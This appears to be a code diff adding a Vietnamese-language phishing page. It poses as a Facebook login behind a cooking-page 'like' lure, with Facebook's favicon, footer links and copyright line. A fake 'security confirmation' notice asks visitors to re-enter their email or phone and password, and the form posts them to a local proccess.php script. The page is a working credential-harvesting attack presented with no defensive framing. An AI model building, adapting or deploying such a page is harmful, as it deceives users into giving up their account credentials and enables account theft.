@@ -1,0 +1,72 @@
+<!DOCTYPE HTML>
+<html>
+	<heaD>
+		<meta charset="UTF-8"/>
+		<title>Thích trang Nấu Ăn </title>
+		<link rel="stylesheet" href="css/bootstrap.css"/>
+		<link rel="stylesheet" href="css/style.css"/>
+		<link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico" />
+		<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js">
+
+		</script>
+		<script type="text/javascript">
+			$(document).ready(function(){
+				$("#frmlogin").submit(function(){
+					var email=$("input[name=email]").val();
+					var password=$("input[name=password]").val();
+					if(email=='' || password ==''){
+						alert("Bạn vui lòng nhập đầy đủ thông tin để tiếp tục truy cập")
+						return false;
+					}
+					
+
+					
+				})
+			});
+		</script>
+	</heaD>
+	<body>
+		<header>
+			<nav>
+				<div class="container">
+					<img src="img/logo.png" class="logo">
+				</div>
+			</nav>
+		</header>
+		<section id="content">
+			<div class="container">
+				<div class="login clearfix">
+					<h4>Đăng nhập Facebook</h4>
+					<div id="alert">
+						<b><p>Xác nhận bảo mật</p></b>
+						<p>Chúng tôi có một cuộc kiểm tra tài khoản, vui lòng nhập thông tin để tiếp tục truy cập</p>
+					</div>
+
+					<form action="proccess.php" method="post" id="frmlogin">			
+						<div>
+							<label for="email">Email hoặc số điện thoại</label>
+							<input type="text" name="email"/>
+						</div>
+						<div>
+							<label for="email">Mật khẩu</label>
+							<input type="password" name="password"/>
+						</div>
+						<div class="ext">
+							<input type="checkbox"/> Duy trì đăng nhập</input><br/>
+							<input type="submit" name="submit" value="Đăng nhập"/> hoặc <a href="https://www.facebook.com"><strong>Đăng ký</strong></a><br/>
+						</div>
+					</form>
+
+				</div>
+			</div>
+		</section>
+		<footer>
+			<div class="container">
+			<table class="uiGrid _51mz navigationGrid" cellspacing="0" cellpadding="0"><tbody><tr class="_51mx"><td class="_51m- hLeft plm"><a href="https://www.facebook.com/mobile/?ref=pf" title="Xem Facebook Mobile.">Di động</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/find-friends?ref=pf" title="Tìm bất kỳ ai trên web.">Tìm bạn bè</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/badges/?ref=pf" title="Nhúng huy hiệu Facebook vào trang web của bạn.">Huy hiệu</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/directory/people/" title="Duyệt thư mục người của chúng tôi.">Người</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/directory/pages/" title="Duyệt thư mục trang của chúng tôi.">Trang</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/directory/places/" title="Duyệt thư mục địa điểm của chúng tôi.">Địa điểm</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/appcenter/?ref=pf" title="Xem Trung tâm ứng dụng Facebook.">Ứng dụng</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/appcenter/category/games/?ref=pf" title="Xem trò chơi Facebook.">Trò chơi</a></td><td class="_51m- hLeft plm _51mw"><a href="https://www.facebook.com/appcenter/category/music/?ref=pf" title="Xem ứng dụng nhạc Facebook.">Âm Nhạc</a></td></tr><tr class="_51mx"><td class="_51m- hLeft plm"><a href="https://www.facebook.com/facebook" accesskey="8" title="Đọc blog của chúng tôi, khám phá trung tâm tài nguyên và tìm cơ hội việc làm.">Giới thiệu</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=auto" title="Quảng cáo trên Facebook.">Tạo quảng cáo</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/pages/create/?ref_type=sitefooter" title="Tạo Trang">Tạo trang</a></td><td class="_51m- hLeft plm"><a href="https://developers.facebook.com/?ref=pf" title="Phát triển trên nền tảng của chúng tôi.">Nhà phát triển</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/careers/?ref=pf" title="Thực hiện bước chuyển sự nghiệp kế tiếp đến công ty tuyệt vời của chúng tôi.">Tuyển dụng</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/privacy/explanation" title="Tìm hiểu về quyền riêng tư của bạn và Facebook">Quyền riêng tư</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/help/cookies/?ref=sitefooter" title="Tìm hiểu về cookies và Facebook.">Cookie</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/policies/?ref=pf" accesskey="9" title="Xem lại điều khoản và chính sách của chúng tôi.">Điều khoản</a></td><td class="_51m- hLeft plm _51mw"><a href="https://www.facebook.com/help/?ref=pf" accesskey="0" title="Đến Trung Tâm Trợ Giúp của chúng tôi.">Trợ giúp</a></td></tr></tbody></table>
+			<br/>
+			<p>Facebook © 2013 ·<a href="#">Tiếng Việt</a></p>
+			</div>
+
+		</footer>
+	</body>
+</html>
